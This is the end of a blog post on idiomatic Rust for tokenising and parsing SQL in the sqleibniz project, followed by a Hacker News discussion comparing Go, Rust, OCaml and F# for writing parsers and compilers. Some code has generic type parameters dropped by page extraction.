./vacuum.sql 2 -- rebuilding the database into a new file 3 VACUUM INTO 'optimized.db' Passing this file to sqleibniz promptly errors: Optionals Rust error handling is fun to do and propagation with the ?-Operator just makes sense. But Rust goes even further, not only can I modify the value inside of the Option if there is one, I can even check conditions or provide default values. is_some_and Sometimes you simply need to check if the next character of the input stream is available and passes a predicate. is_some_and exists for this reason: 1 fn next_is(&mut self, c: char) -> bool { 2 self.source 3 .get(self.pos + 1) 4 .is_some_and(|cc| *cc == c as u8) 5 } 6 7 fn is(&self, c: char) -> bool { 8 self.source.get(self.pos).is_some_and(|cc| *cc as char == c) 9 } The above is really nice to read, the following not so much: 1 fn next_is(&mut self, c: char) -> bool { 2 match self.source.get(self.pos + 1) { 3 Some(cc) => *cc == c as u8, 4 _ => false, 5 } 6 } 7 8 fn is(&self, c: char) -> bool { 9 match self.source.get(self.pos) { 10 Some(cc) => *cc as char == c, 11 _ => false, 12 } 13 } map Since the input is a Vector of u8, not a Vector of char, this conversion is done with map: 1 fn next(&self) -> Option { 2 self.source.get(self.pos + 1).map(|c| *c as char) 3 } Instead of unwrapping and rewrapping the updated value: 1 fn next(&self) -> Option { 2 match self.source.get(self.pos + 1) { 3 Some(c) => Some(*c as char), 4 _ => None, 5 } 6 } map_or In a similar fashion, the sqleibniz parser uses map_or to return the check for a type, but only if the current token is Some: 1 fn next_is(&self, t: Type) -> bool { 2 self.tokens 3 .get(self.pos + 1) 4 .map_or(false, |tok| tok.ttype == t) 5 } 6 7 fn is(&self, t: Type) -> bool { 8 self.cur().map_or(false, |tok| tok.ttype == t) 9 } Again, replacing the not so idiomatic solutions: 1 fn next_is(&self, t: Type) -> bool { 2 match self.tokens.get(self.pos + 1) { 3 None => false, 4 Some(token) => token.ttype == t, 5 } 6 } 7 8 fn is(&self, t: Type) -> bool { 9 if let Some(tt) = self.cur() { 10 return tt.ttype == t; 11 } 12 false 13 } Iterators 💖 Filtering characters Rust number parsing does not allow _, sqlite number parsing accepts _, thus the lexer also consumes them, but filters these characters before parsing the input via the rust number parsing logic: 1 let str = self 2 .source 3 .get(start..self.pos) 4 .unwrap_or_default() 5 .iter() 6 .map(|c| *c as char) 7 .filter(|c| *c != '_') 8 .collect::(); Tip I know you aren’t supposed to use unwrap and all derivates, however in this situation the parser either way does not accept empty strings as valid numbers, thus it will fail either way on the default value. In go i would have to first iterate the character list with a for loop and write each byte into a string buffer (in which each write could fail btw, or at least can return an error) and afterwards I have to create a string from the strings.Builder structure. 1 s := source[start:l.pos] 2 b := strings.Builder{} 3 b.Grow(len(s)) 4 for _, c := range s { 5 if c != '_' { 6 b.WriteByte(c) 7 } 8 } 9 s = b.String() Checking characters Sqlite accepts hexadecimal data as blobs: x'', to verify the input is correct, I have to check every character in this array to be a valid hexadecimal. Furthermore I need positional information for correct error display, for this I reuse the self.string() method and use the chars() iterator creating function and the enumerate function. 1 if let Ok(str_tok) = self.string() { 2 if let Type::String(str) = &str_tok.ttype { 3 let mut had_bad_hex = false; 4 for (idx, c) in str.chars().enumerate() { 5 if !c.is_ascii_hexdigit() { 6 // error creation and so on omitted here 7 had_bad_hex = true; 8 break; 9 } 10 } 11 if had_bad_hex { 12 break; 13 } 14 15 // valid hexadecimal data in blob 16 } 17 } else { 18 // error handling omitted 19 } The error display produces the following error if an invalid character inside of a blob is found: Info Thanks for reading this far 😼.

    "commentBody": "Rust for tokenising and parsing (xnacly.me)258 points by thunderbong 16 hours agohidepastfavorite193 comments miningape 9 hours agoAbout 2 months ago I would have said the same as the author, but I kept running against the hard edges of Rust: the borrow checker. I realised that while I really liked using algebraic data types (e.g. Enums) and pattern matching, the borrow checker and the low level memory concerns meant I spent a lot of time fighting the borrow checker instead of fighting the PL issues at the heart of my project. So while tokenising/parsing was nice, interpreting and typechecking became the bane of my existence With that realisation I started looking for another more suitable language - I knew the FP aspects of Rust are what I was looking for so at first I considered something like F# but I didn't like that it's tied to microsoft/.NET. Looking a bit further I could have gone with something like Zig/C but then I lose the FP niceness I'm looking for. I also spent a fair amount of time looking at Go, but eventually decided that 1. I wanted a fair amount of syntax sugar, and 2. golang is a server side language, a lot of its features and library are geared towards this use case. Finally I found OCaml, what really convinced me was seeing the syntax was like a friendly version of Haskell, or like Rust without lifetimes. In fact the first Rust compiler was written in OCaml, and OCaml is well known in the programming language space. I'm still learning OCaml so I'm not sure I can give a fair review yet, but so far it's exactly what I was looking for. reply krick 8 hours agoparentBringing up goland always annoys me for some reason. Like, it's really practical, it is fast, but not actually low-level, it compiles fast, and most importantly it is very popular and has all the libraries. It seems like I should use it. But I just almost irrationally hate the language itself. Everything about it is just so ugly. It's a language invented in 2009 by some C-people who are apparently oblivious to everything that excited PL design folks for the last 20 years (as of 2009). PHP in 2009 was already a more modern and better designed language than goddamn golang. And golang didn't really improve since. I just cannot let it go somehow. reply guappa 6 hours agorootparentI've had to use go occasionally and it feels like the language is designed to stop me from achieving my goals. The standard library is unimpressive (to be generous), it has plenty of footguns like C but none of its flexibility. Also for some reason parenthesis AND are required. So you get the worse of C and python there. reply danudey 2 hours agorootparent> The standard library is unimpressive (to be generous) Coming from Python, this is one of the major things that I just can't get past with golang (despite having to use it for work). The standard library has a lot of really interesting/impressive/useful things to cover niche cases, but is missing a lot of what I would consider basic functionality that I keep running into requiring me to go get an external module to solve the problem. Then, on top of that, the documentation for external modules is extremely terrible. In many cases the best you can get is API documentation in the form of \"these are the functions, this is what they take and return\" with no explanation of what those values need to be, what the function does with them, and so on; a simple list of functions. In others, there is that plus example code which doesn't work because it hasn't been updated since the last time backwards-incompatible changes were made so you end up down a rabbit hole of trying to debug someone else's wrong code. The only thing letting me write effective golang at this point is that VSCode can autocomplete a lot of method calls, API calls, and so on, and then tell me what parameters they need, but even then I'm just guessing about what function might exist and what it might be called. The language itself is okay and the more I use it the more I understand why they implemented all the stuff I hate (like a lack of proper error handling leading to half of my lines of code being boilerplate `if err != nil` blocks), but if the tooling around it wasn't so good no one would take it remotely seriously. reply aftbit 3 hours agorootparentprevYou're intended to run gofmt on every save. golang is designed to be a sort of straight-jacket that forces everyone to write code in the same way (style etc) so that the junior devs can understand it clearly. reply grey-area 3 hours agorootparentAnd so that people (of any level) don't bikeshed over silly things like tabs and spaces or { and newlines. I really like this about go - that it formats code for you, and miss it in other languages where we have linters but not formatters, which is a terrible idea IMO. reply umanwizard 6 minutes agorootparentWhat mainstream languages don’t have formatters nowadays? Rust has rustfmt, C and related languages have clang-tidy, python has Black… reply pimeys 7 hours agorootparentprevI know, I'm on the same boat. What I realized is I just need to avoid the companies using Go and I don't really need to be vocal about my dislike. It's not my loss if others find the language useful, but for me it either solves problems I'm not interested in solving, or the language and tooling just does not make it for me. But, I can always just write Rust and be happy where I am. Or, to be honest, would not be very unhappy with F#, Haskell or Ocaml either. reply meowface 6 hours agorootparent>What I realized is I just need to avoid the companies using Go What do you mean, exactly? reply leftyspook 6 hours agorootparentI'd imagine not seeking employment at Google is a big part. reply tempest_ 5 hours agorootparentGo is definitely used a lot more outside of google as of late. Anecdotally I would say where a lot of companies would have used Java in the past they are now turning to go for their server-side/backend service implementations. reply danudey 2 hours agorootparentAlso it feels like pretty much everything in the k8s/container/etc. space is go-related, which kind of makes sense. reply pjmlp 6 hours agorootparentprevIt is worse than that, as Go initially lacked generics (introduced by CLU and ML in 1976), still doesn't do even basic Pascal enumerations (1970) rather the iota/const dance, let alone the 1990's programming language design surface. I only advocate for it on the scenarios where a garbage collected C is more than enough, regardless of the anti-GC naysayers, e.g. see TamaGo Unikernel. reply randomdata 2 hours agorootparent> still doesn't do even basic Pascal enumerations The term you are looking for is sum types (albeit in a gimped form in the case of Pascal). Enumerations refer to the value applied to the type, quite literally, and is identical in Pascal as every other language with enumerations, including Go. There is only so much you can do with what is little more than a counter. reply samatman 1 hour agorootparentI'm fairly sure he's referring to enumerations actually. Pascal doesn't require case matching of enumerations to be exhaustive, but this can be turned on as a compiler warning in modern Pascal environments, FreePascal / Lazarus and such. Go only has enums by convention, hence the \"iota dance\" referred to. I've argued before that this does qualify as \"having enums\" but just barely. It wouldn't have been difficult to do a much better job of it, is the thing. reply randomdata 1 hour agorootparent> Pascal doesn't require case matching of enumerations to be exhaustive Normally in Pascal you would not match on the enumeration at all, but rather on the sum types. type Foo = (Bar, Baz) case foo: Bar: ... // Matches type Bar Baz: ... // Matches type Baz The only reason for enumerations in Pascal (and other languages with similar constructs) is because under the hood the computer needs a binary representation to identify the type, and an incrementing number (an enum) is a convenient source for an identifier. In a theoretical world where the machine is magic you could have the sum types without enums, but in this reality... Thus, yes, in practice it is possible to go around the type system and get the enumerated value out with Ord(foo), but at that point its just an integer and your chance at exhaustive matching is out the window. It is the type system that allows more flexibility in what the compiler can tell you, not the values generated by the enumeration. > Go only has enums by convention \"Enums by convention\" would be manually typing 1, 2, 3, 4, etc. into the code. Indeed, that too is an enumeration, but not as provided by the language. Go actually has enums as a first-class feature of the language[1]. You even say so yourself later on, so this statement is rather curious. I expect you are confusing enums with sum types again. [1] Arguably Pascal doesn't even have that, only using enums as an implementation detail to support its sum types. Granted, the difference is inconsequential in practice. reply Thaxll 5 hours agorootparentprevSo every language have to implement every features released in the last 50 years? reply pjmlp 5 hours agorootparentNot necessarly, but designing for stone age computers isn't ideal either, even C, Fortran and COBOL have progressed during those 50 years. reply treyd 5 hours agorootparentprevI expect it to implement features that have become ubiquitous in every other mainstream language from the last 30 years, yes. reply Thaxll 5 hours agorootparentThat's how you end up with C++ and soon C#. reply biorach 3 hours agorootparentNo, the person you were replying to was advocating for the intersection of ubiquitous features.

And it overlaps partially with stated goals of an easy language to onboard inexperienced devs with. Nothing wrong with that, but it will probably never work for me. Newer versions of Java are much more enjoyable to work with versus Go. reply keldaris 3 hours agorootparent> I’m convinced there’s a contingent of devs who don’t like/grok abstraction. I am one of those. I grok abstractions just fine (have commercially written idiomatically obtuse Scala and C#, some Haskell for fun, etc.), but I don't enjoy them. I use them, of course (writing everything in raw asm is unproductive for most tasks), but rather than getting that warm fuzzy feeling most programmers seem to get when they finish writing a fancy clever abstraction and it works on the first try, I get it when I look at a piece of code I've written and realize there is nothing extraneous to take away, that it is efficient and readable in the sense of being explicit and clear, rather than hiding all the complexity away in order to look pretty or maximize more abstract concerns (reusability, DRY, etc.). This mindset is a very good fit for writing compute-heavy numerical code, GPU stuff and lots of systems level code, not so much for being a cog in a large team on enterprise web backends, so I mostly write numerical code for physics simulations. You can write many other things this way and get very fast and bloatfree websites or anything else, but it doesn't work well in large teams or people using \"industry best practices\". It also makes me prefer C to Rust. reply fuzztester 3 hours agorootparent>I get it when I look at a piece of code I've written and realize there is nothing extraneous to take away, \"Perfection is achieved, not when there is nothing more to add, but when there is nothing left to take away.\" - Antoine de Saint-Exupery https://www.brainyquote.com/quotes/antoine_de_saintexupery_1... reply grey-area 2 hours agorootparentprevStrange that you bracket don't like/don't understand together like that. The vast majority understand abstractions just fine, though each takes time to understand. However most people like their own abstractions best, and those of other people less. To me hell is living in a world of bad abstractions created by someone else. Every abstraction created adds to cognitive load when reading the code and to the maintenance burden of that code. So you have an abstraction budget, which is usually in overspent IME and needs to be carefully controlled. Most of the most horrible codebases are horrible because they have too many of the wrong sort of abstraction. reply mattgreenrocks 1 hour agorootparentEveryone lands at a different spot. Personally, I don't want to write any new code in something that doesn't have ADTs, or the moral equivalent (Java's sealed classes). I've already written a lifetime of code without them, so I suppose part of that is not wanting to write another 20 years of the same code. :) reply ralegh 4 hours agorootparentprevI guess I’m in that camp. I can come up with a good abstraction after working on a problem for a while and refactor it into my code. Or I can come up with a really simple abstraction (eg a Go interface with 2-3 methods), and that usually works well. But I try to avoid starting a project by defining a bunch of abstractions, since I just end up writing loads of boiler plate. Yes, I’m probably doing some things wrong. reply mattgreenrocks 1 hour agorootparentSounds about right. Proper abstractions are difficult to get right up front, might as well pull them out only when they're obvious and profitable. reply seanw444 3 hours agorootparentprevMan, Go gets a lot of hate on here. It's certainly not the most flexible language. If I want flexibility + speed, I tend to choose Nim for my projects. But for practical projects that I want other people to be able to pick up quickly, I usually opt for Go. I'm building a whole product manufacturing rendering system for my company, and the first-class parallelism and concurrency made it super pleasant. I will say that the error propagation is a pain a lot of the time, but I can appreciate being forced to handle errors everywhere they pop up, explicitly. reply f154hfds 3 hours agorootparentSo much of language opinion is based on people's progression of languages. My progression (of serious professional usage) looked like this: Java -> Python -> C++ -> Rust -> Go I have to say, given this progression going to Rust from C++ was wonderful, and going to Go from Rust was disappointing. I run into serious language issues almost daily. The one I ran into yesterday was that defer's function arguments are evaluated immediately (even if the underlying type is a reference!). https://go.dev/play/p/zEQ77TIP8Iy Perhaps with a progression Java -> Go -> Rust moving to rust could feel slow and painful. reply 62951413 1 hour agorootparentI'm curious how one ends up with such ahistorical sequence. I'd expect it to be more aligned with the actual PL history. Mainstream PLs have had a fairly logical progression with each generation solving well understood problems from the previous one. And building on top of the previous generation's abstractions. Turbo Pascal for education, C as professional lingua franca in mid-90s (manual memory management). C++ was all the rage in late 90s (OOP,STL) . Java got hot around 2003 (GC, canonical concurrency library and memory model). Scala grew in popularity around 2010-2012 (FP for the masses, much less verbosity, mainstream ADTs and pattern matching). Kotlin was cobbled together to have the Scala syntactic sugar without the Haskell-on-the-JVM complexity later. And then they came up with golang which completely broke with any intellectual tradition and went back to before the Java heyday. Rust feels like a Scala with pointers so the \"C++ => Rust\" transition looks analogous to the \"Java => Scala\" one. reply aaronblohowiak 55 minutes agorootparent>I'm curious how one ends up with such ahistorical sequence. they are all actively in-use.. if gp is earlier in their career, it could all be in last 10 years. reply materielle 1 hour agorootparentprevGo is definitely of the “worse is better” philosophy. You can basically predict what someone will think of Go if you know how they feel about that design philosophy. I remember that famous rant about how Go’s stdlib file api assumes Unix, and doesn’t handle Windows very well. If you are against “worse is better” like the author, that’s a show stopping design flaw. If you are for it, you would slap a windows if statement and add a unit test when your product crosses that bridge. reply speed_spread 1 hour agorootparentprevThe problem is that most of the time, errors are not to be handled but only bubbled up. I've also seen it in Java with checked exceptions: the more explicit error handling is, the more developers feel they should somehow try to do _something_ with the error when the correct thing to do would actually be to fail in the most straightforward manner. The resulting code is often much heavier than necessary because of this and the stacktraces also get polluted by overwrapping. reply dinosaurdynasty 3 hours agorootparentprevI use golang for work and have done a fair amount of Rust programming. Rust feels like the higher level language. This really shouldn't be the case. reply tuveson 2 hours agorootparentprevFast to compile, fast to run, simple cross-compilation, a big standard library, good tooling… As ugly and ad-hoc as the language feels, it’s hard to deny that what a lot of people want is just good built-in tooling. I was going to say that maybe the initial lack of generics helped keep compile times low for go, but OCaml manages to have good compile times and generics, so maybe that depends on the implementation of generics (would love to hear from someone with a better understanding of this). reply klodolph 2 hours agorootparentThere are a million little decisions that affect compile time. A big factor here is inlining. When you inline functions, you may improve the generated code or you may make it worse. It’s hard to predict the result because the improvements may come about because of various other code transformation passes which you perform after inlining. After inlining, the compiler detects that certain code paths are impossible, certain calls can be devirtualized, etc., and this can enable more inlining. Rust is designed with the philosophy of zero-cost abstractions. (I don’t like the name, because the cost is never zero, but it is what it is.) The abstractions usually involve a lot of function calls and you need a compiler with aggressive inlining in order to get reasonable performance out of Rust. Usage of generics still results in the same non-virtual calls which can be inlined. But the compiler then has to do a lot of work to evaluate inlining for every instantiation of every generic. Go is designed with the philosophy of simple abstractions, which may come with a cost. Generics are implemented in a way that means you are still doing a lot of dynamic dispatch. If you need speed in Go, you should be writing the monomorphic code yourself. Generics don’t get instantiated for every single type you use them with. They only get instantiated for every “shape” of type. reply sophacles 1 hour agorootparent> Rust is designed with the philosophy of zero-cost abstractions. (I don’t like the name, because the cost is never zero, but it is what it is.) So when the generated asm is the same between the abstraction and the non-abstraction version, wheres the cost? reply steveklabnik 1 hour agorootparentThe point is that different people have different understandings of \"cost.\" You're correct that that kind of cost is what \"zero cost abstractions\" means, but there are other costs, like \"how long did it take to write the code,\" that people think about. reply samatman 51 minutes agorootparentprevCognitive cost is the most important cost to minimize. A Rust project's cognitive cost budget comes out of what's left over after the language is done spending. This is true of any language, but many language designers do not discount cognitive costs to zero, which, with the \"zero cost abstraction\" slogan, Rust explicitly does. reply madeofpalk 5 hours agorootparentprevgo’s error handling patterns, while lacking every established feature that makes it ergonomic, is baffling. Embarrassing that developers are still forgetting nil pointer checks in 2024. reply ziml77 5 hours agorootparentThe error handling is one of the worst parts of Go for me. Every call that can fail ends up being followed by 3 lines of error handling even if it's just propagating the error up. The actual logic get drowned out. reply danudey 1 hour agorootparentI would kill for some kind of `err_yield(err)` construct that handles propagating the error if it's the caller's problem to deal with. That said, I discovered that Go has the ability to basically encapsulate one error inside of another with a message; for example, if you get an err because your HTTP call returned a 404, you can pass that up and say \"Unable to contact login server: \". But then the caller takes that error and says \"Could not authenticate user: \", and _their_ caller returns \"Could not complete upload: \" and you end up with a four-line string of breadcrumbs that is ostensibly useful but not very readable. Python's `raise from` produces a much more readable output since it amounts to much more than just a bunch of strings that force you to follow the stack yourself to figure out where the error was. reply randomdata 3 hours agorootparentprev> But I just almost irrationally hate the language itself. That's the point.

So, the language that we give them has to be easy for them to understand and easy to adopt.\" - Rob Pike I suppose in a sense this is rejecting the \"keyboard jockeys\", but probably not in the way you mean. You cannot separate the tool used to solve a problem from the problem itself. The choice of tool is a critical and central consideration. reply grey-area 2 hours agorootparentI think you're giving far too much weight to that off the cuff quote from one of the creators of Go. Really I think it's more useful to view it as a better C in the less is more tradition, compared to say C++ and Java, which at the time were pretty horrible. That's my understanding of its origin. It makes sense in that context; it doesn't have pretensions to be a super advanced state of the art language, but more of a workhorse, which as Pike pointed out here could be useful for onboarding junior programmers. Certain things about it I think have proven really quite useful and I wish other languages would adopt them: * It's easy to read precisely because the base language is so boring * Programs almost never break on upgrade - this is wonderful * Fewer dependencies, not more * Formatters for code Lots of little things (struct tags for example) I'm not so keen on but I think it's pretty successful in meeting its rather modest goals. reply wyager 1 hour agorootparent> Really I think it's more useful to view it as a better C But Go is nothing at all like C, and it's completely unsuitable for most of the situations where C is used. I'm having trouble even imagining what you're getting at with this comparison.

Go is GC'd, Go has a runtime, etc. reply randomdata 2 hours agorootparentprevThat's saying the same thing. If you give someone the ability to understand a brilliant language, they will turn their attention to the language and away from the problem. That's just human nature. Shiny attracts us. Let's be honest, we all have way more fun diving deep into crafting the perfect type in Haskell.

I can still remember when the Go zealots were everywhere (it's cooled down now). Every feature Go didn't have was \"too complicated and useless\", while the few features it did have were \"essential and perfect\". I've really tried giving Go a go, but it's truly the only language I find physically revolting. For a language that's supposed to be easy to learn, it made sooooo many weird decisions, seemingly just to be quirky. Every single other C-ish language declares types either as \"String thing\" or \"thing: String\". For no sane reason at all, Go went with \"thing String\". etc. etc. I GENUINELY believe that 80% of Gos success has nothing to do with the language itself, and everything to do with it being bankrolled and used by a huge company like Google. reply marcosdumay 3 hours agorootparentprevWhatever reasons are there for using or not the language, tokenising and parsing are absolutely not a problem you want to solve with it. reply dlisboa 5 hours agorootparentprev> It's a language invented in 2009 by some C-people who are apparently oblivious to everything that excited PL design folks for the last 20 years (as of 2009).

It feels like it fights any attempt at using it to do things optimally or quickly. reply rtpg 8 hours agoparentprevI think one core thing that you have to do with ASTs in Rust is to absolutely not store strings of the like in your AST. Instead you want to use something like static string libraries (so you get cheap clones and interning) and for things like positions in text you want to use just indices. Absolutely avoid storing references if you can avoid it! The more your stuff is held in things that are cheap/free to clone, the less you have to fight the borrow checker… since you can get away with clones! And for actual interpretation there’s these libraries that can help a lot for memory management with arenas and the like. It’s super specialized stuff but helps to give you perf + usability. Projects like Ruffle use this heavily and it’s nice when you figure out the patterns Having said that OCaml and Haskell are both languages that will do all of this “for free” with their built in reference counting and GC… I just like the idea of going very fast in Rust reply radicalbyte 9 hours agoparentprevI've been writing a lot of Golang in the last year and I wouldn't use it for writing a parser. It's just a modernised C, the model it provides is very simple (coming from C# the simplicity actually made it harder to learn!) and is very well suited to small, focused applications where a low conceptual load are beneficial and the trade off of verbosity are acceptable. F# or even the latest version of C# are what I would recommend. Yes Microsoft are involved but if you're going to live in a world where you won't touch anything created by evil corporations then you're going to have a hard time. Java, Golang, Python, TypeScript/Javascript and Swift all suffer from this. That leaves you with very little choice. I'd be interested in hearing your thoughts over OCaml after a year or so of using it. The Haskell-likes are very interesting but Haskell itself has a poor learning curve / benefit ratio for me (Rust is similar there actually; I mastered C# and made heavy use of the type system but that involved going very very deep into some holes and I don't have the time to do that with Rust). reply galangalalgol 3 hours agorootparentF# and Ocaml are still functionally identical to the point many programs would compile in either right?

And in fact, I do it professionally. But I totally agree that for parsers, it’s not the right tool for the job. First off, the only way to express union types is with runtime reflection. You might as well be coding in Python (but without the convenient syntax sugar). Second off, “if err != nil” is really terrible in parsers. I’m actually somewhat of a defender of Go’s error handling approach in servers. Sure, it could have used a more convenient syntax. But in servers, I almost never return an error without handling it or adding additional context. The same isn’t true in parser’s though. Almost half of my parser code was error checks that simply wouldn’t exist in other languages. For Rust, I think the value proposition is if you are also writing a virtual machine or an interpreter, your compiler front end can be written in the same language as your backend. Your other alternatives are C and C++, but then you don’t have sum types. You could write the front end in Ocaml, but then you would have to write the backend and runtime in some other language anyways. reply ralegh 9 hours agoparentprevI wouldn't call Go a 'server side' language. The Go compiler is written in Go, for example! Cross compilation and (relatively) small binaries make it super easy for distribution. Syntax sugar is a fair point though, it doesn't lend itself to functional-y pattern matching. reply eminent101 9 hours agorootparent> The Go compiler is written in Go, for example! Do you know how they avoid the GC in the Go implementation of the Go compiler? If I understand correctly they need to implement the Go garbage collector in their Go implementation of the Go compiler. But Go already has a garbage collector. So how do they avoid invoking Go's garbage collector so that they can implement the garbage collector of the Go language they are implementing? Not sure if I'm making sense but I'd like to know more about this from those who understand this more than I do. reply enugu 8 hours agorootparentWe can think of the Compiler as a function from a string to a string - high level (HLC), to low level code(LLC). LLC can include the garbage collection code(if it is run as a standalone executable instead of garbage collection being done by a separated runtime). The compiler executable itself is running in a compilation process P which uses memory and has its own garbage collection. (The compiler executable was itself generated by a compilation, using a compiler written in Go itself(self-hosting) or initially, in another language). But the compilation process P is unrelated to the process Q in which the generated code, LLC, will run when first executed. The OS which runs LLC doesn't even know about the compiler - LLC is just another binary file. The garbage collection in P doesn't affect garbage collection in Q. Indeed, it should be easy for the compiler to generate an assembly program which constantly keeps allocating more memory until the system runs out, while compiling say a loop which allocates a struct within a loop running a billion times. Unless, of course, you explicitly also generate a garbage collector as part of the low level code. Your question does become very interesting in the realm of security, there is a famous paper called \"Trusting Trust\" where a compiled compiler can still have backdoors even if the compiled code is trustworthy and the compiler code is trustworthy but the code which compiled the compiler had backdoors. reply James_K 6 hours agorootparentprevThey just use the implementation from the last version of the compiler, which you can follow back in a long chain to the first implementation. As for the implementation of the garbage collector, it probably just doesn't allocate anything. The basics of a garbage collector are a function \"alloc\" and another one \"collect\". The function to allocate memory usually looks something like this: char heap[100000000]; int heap_end; void *alloc(int n_bytes) { void *out = &heap[heap_end] heap_end += n_bytes; return out; } As you can see, it doesn't need to allocate any memory to do this. reply umanwizard 4 hours agorootparent> They just use the implementation from the last version of the compiler The garbage collector isn’t part of the compiler, it’s part of the runtime. It’s worth being clear about this distinction because I think it’s the root of the OP’s confusion. reply wrs 3 hours agorootparentSure, but what’ll really bake OP’s noodle is that Go’s GC is written in Go too. :) [0] [0] https://go.dev/src/runtime/mgc.go reply miningape 8 hours agorootparentprevRemember that a compiler generates an executable file (can almost be thought of as an ASM transpiler), this file must contain everything the language needs to operate (oversimplification) so that includes the runtime as well as the compiled instructions from the user's code. This is compared to an interpreter which doesn't require you to pack all the implementation details into a binary, so instead you can use the host language's runtime. All this to say: the output of a compiler is by necessity not tied to the language the compiler is written in, instead it is tied to the machine the executable should run on. A compiler \"merely\" translates instructions from a high level language to a machine executable one. So stuff like a GC must be coded, compiled and then \"injected\" into the binary so the user's code can interact with it. In an interpreted language this isn't necessary, since the host language is already running and contains these tools which would otherwise have to be injected into the binary. reply umanwizard 5 hours agorootparentprevHow does clang, a C++ compiler that is itself written in C++, usethat it is itself implementing? Why wouldn’t it be able to? I don’t understand how your question specifically relates to garbage collection, or why the compiler would need to avoid it. The Go compiler is a normal Go program and garbage collection works in it the same way it does in any other Go program. reply P-Nuts 5 hours agorootparentprevI’ve never used Go myself, but according to this https://go.dev/doc/install/source you need a Go compiler to compile Go. However, for the early versions, you needed a C compiler to compile Go. So at some point, someone wrote enough of a Go GC in C to support enough of Go to compile itself. reply dboreham 7 hours agorootparentprevDefinitely not making sense. Other answers appear to assume you don't know what a compiler is, but I'm not so sure. Re-state the question perhaps? reply afandian 8 hours agorootparentprevI don't understand the question as it's written. But the shape of the question feels like you're asking about whether an interpreter (which the compiler is not) uses the GC of the host language? reply ben0x539 8 hours agorootparentI think they're asking how the code in the Go runtime (not the compiler, that being an interesting but also maybe non-obvious distinction!) that implements the garbage collector, a core feature of the language, avoids needing the garbage collector to already exist to be able to run, being written in the language that it's a core feature of. I suspect the answer is just something like \"by very carefully not using language features that might tempt the compiler to emit something that requires an allocation\". I think it's a fair question as it's not really obvious that that's possible--do you just avoid calling make() and new() and forming pointers to local variables that might escape? Do you need to run on a magical goroutine that won't try to grow its stack with gc-allocated segments? Can you still use slices (probably yes, just not append() or the literal syntax), closures (probably only trivial ones without local captures?), maps (probably no)...? I think the relevant code is https://github.com/golang/go/blob/master/src/runtime/mgc.go and adjacent files. I see some annotations like //go:systemstack, //go:nosplit, //go:nowritebarrier that are probably relevant but I wouldn't know if there's any other specific requirements for that code. reply dboreham 7 hours agorootparentWhy would the runtime not be allowed to use GC?

First, that is a problem only for the very first version of X. Then you use X for version X+1. Second, building from source usually doesn't mean having to build every single dependency. Some .so or .dll are already in the system. Only when one has to build everything from scratch the first step would have to solve the original X from X problem but I think that even a Gentoo full system build doesn't start with a user setting in bytes in RAM with switches (?), setting the program counter of the CPU and its registers to eventually start the bootstrap process. reply miningape 9 hours agorootparentprevWell now I've got to go check out the go compiler! That sounds really interesting. I was mainly referring to go having a lot more developed concurrency features, which while they're great I didn't really want to use them for my toy language, it seemed like I was throwing away a lot of what makes golang great just because of the nature of my project. The rest of the golang ecosystem I found really nice actually, and imo it had a really great set of tools for reading/writing to files - and also I like that everything is apart of the go binary, it certainly is easier than juggling between opam and dune (used for OCaml for example). reply ralegh 9 hours agorootparentThat's fair, the concurrency features are very handy though optional of course. The ecosystem and tooling are great, probably the best I've worked with. But the main reason I reach for Go is that it's got tiny mental overhead. There's a handful of language features so it becomes obvious what to use, so you can focus on the actual goal of the project. There are some warts of course. Heavy IO code can be riddled with err checks (actually, why I find it a bit awkward for servers). Similarly the stdlib is quite verbose when doing file system manipulation, I may try https://github.com/chigopher/pathlib because Python's pathlib is by far my favourite interface. reply ThePhysicist 9 hours agoparentprevLots of folks use Golang on the client side, even on mobile (for which Go has really great support with go-mobile). Of course it adds around 10-20 MB to your binary and memory footprint but in todays world that's almost nothing. I think Tailscale e.g. uses Golang as a cross-platform Wireguard layer in their mobile and desktop apps, seems to work really well. You wouldn't build a native UI using Golang of course but for low-level stuff it's fantastic.

That being said, people seem to really dislike Go here, which is fine, but somewhat surprising. Go is extremely simple. If you take a look at it's creators pedigree, that should make a ton of sense: they want you to make small, focused utilities and systems that use message passing (typically via a network) as the primary means of scaling complexity.

But, seeing as OCaml was the basis for F#, I have a question, though: Does OCaml allow the use of specifically sized integer types? I seem to remember in my various explorations that OCaml just has a kind of \"number\" type. If I want a floating point variable, I want a specific 32- or 64- or 128-bit version; same with my ints.

By simple virtue of using .NET and having access to very wide selection of libraries that make it a non-issue when deciding to solve a particular business case. It also has an alternate compiler Fable which can target JS allowing the use of F# in front-end. Other options have worse support and weaker tooling, and often not even more open development process (e.g. you can see and contribute to ongoing F# work on Github). This tired opinion \".net bad because microsoft bad\" has zero practical relevance to actually using C# itself and even more so F# and it honestly needs to die out because it borders on mental illness.

I've found the same, being effective in Rust really requires that you change your way of thinking about your data structures (and code layout). Once I realized that, I was no longer fighting the borrow checker and I've been about to build complex code that more or less worked immediately. As I look back on it, I think what a pain it would have been to write and debug in C, although doing it in C would appear to be \"easier\". reply pimeys 9 hours agoparentprevOCaml has been pretty common tool to write parsers for many years. Not a bad choice. I've written parsers professionally with Rust for two companies now. I have to say the issues you had with the borrow checker are just in the beginning. After working with Rust a bit you realize it works miracles for parsers. Especially if you need to do runtime parsing in a network service serving large traffic. There are some good strategies we've found out to keep the borrow checker happy and at the same time writing the fastest possible code to serve our customers. I highly recommend taking a look how flat vectors for the AST and using typed vector indices work. E.g. you have vector for types as `Vec` and fields in types as `Vec`. Keep these sorted, so you can implement lookups with a binary search, which works quite well with CPU caches and is definitely faster than a hashmap lookup. The other cool thing with writing parsers with Rust is how there are great high level libraries for things like lexing: https://crates.io/crates/logos The cool thing with Logos is it keeps the source data as a string under the surface, and just refers to a specific locations in it. Now use these tokens as a basis for your AST tree, which is all flat data structures and IDs. Simplify the usage with a type: #[Clone, Copy] struct Walker { pub id: Id, pub ast: &'a Ast, } impl Walker { pub fn walk(self, other_id: T) -> Walker { Walker { id: other_id, ast: self.ast } } } Now you can specialize these with type aliases: type TypeWalker = Walker; And implement methods: impl TypeWalker { fn as_ref(&self) -> &'a Type { &self.ast[self.id] } fn name(&self) -> &'a str { &self.as_ref().name } } From here you can introduce string interning if needed, it's easy to extend. What I like about this design is how all the IDs and Walkers are Copy, so you can pass them around as you like. There's also no reference counting needed anywhere, so you don't need to play the dance with Arc/Weak. I understand Rust feels hard especially in the beginning. You need to program more like you write C++, but with Rust you are enforced to play safe. I would say an amazing strategy is to first write a prototype with Ocaml, it's really good for that. Then, if you need to be faster, do a rewrite in Rust. reply miningape 9 hours agorootparentThanks for your comment, you've given me a lot to chew on and I think I'll need to bookmark this page. > I've written parsers professionally with 